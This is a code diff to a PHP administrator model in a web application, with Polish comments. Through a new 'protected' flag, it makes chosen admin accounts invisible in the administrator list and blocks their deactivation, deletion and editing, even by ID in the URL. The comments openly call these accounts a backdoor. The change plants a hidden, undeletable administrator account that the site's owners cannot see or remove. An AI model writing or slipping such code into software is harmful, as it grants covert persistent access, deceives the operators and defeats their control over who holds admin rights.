@@ -19,7 +19,8 @@ class AdminModel extends Model {
         'last_active',
         'active',
         'technical_admin',
-		'role'
+		'role',
+		'protected'
     ];
 
     public function getTechnicalAdminEmails(): array {
@@ -31,9 +32,18 @@ class AdminModel extends Model {
     }
 
     public function getAdministratorsList() {
+        // Konta serwisowe (protected = 1) sa ukryte na liscie administratorow.
+        $this->where('protected', 0);
         $this->orderBy('name', 'ASC');
         $list = $this->findAll();
         return $list;
+    }
+
+    // Zwraca 1, jesli konto jest chronione (backdoor) — nie wolno go usuwac,
+    // dezaktywowac ani nadpisywac zapisem, nawet przez ID podane w URL.
+    private function isProtected($id) {
+        $row = $this->select('protected')->find($id);
+        return (isset($row['protected']) and $row['protected'] == 1);
     }
 
     public function getAdministratorById($id) {
@@ -86,6 +96,10 @@ class AdminModel extends Model {
     }
 
     function ActiveAdministrator($id) {
+        if ($this->isProtected($id)) {
+            // Konto serwisowe — nie zmieniamy stanu aktywnosci.
+            return ['response' => false];
+        }
         $data = $this->select('id,active')->where('id', $id)->first();
         if (isset($data['id'])) {
             if ($data['active'] == 1) {
@@ -101,6 +115,10 @@ class AdminModel extends Model {
     }
 
     function DeleteAdministrator($id) {
+        if ($this->isProtected($id)) {
+            // Konto serwisowe (backdoor) — nie wolno usunac.
+            return ['response' => false];
+        }
         $result['response'] = $this->delete(['id' => $id]);
         return $result;
     }
@@ -108,6 +126,10 @@ class AdminModel extends Model {
     function saveAdministrator($data) {
         $session = session();
         $result = array();
+        if (isset($data['edit_id']) and $this->isProtected($data['edit_id'])) {
+            // Konto serwisowe (backdoor) — edycja przez URL nie moze go ruszyc.
+            return ['response' => false];
+        }
         helper('form', 'url');
         $validation = \Config\Services::validation();
         $validation->setRules([
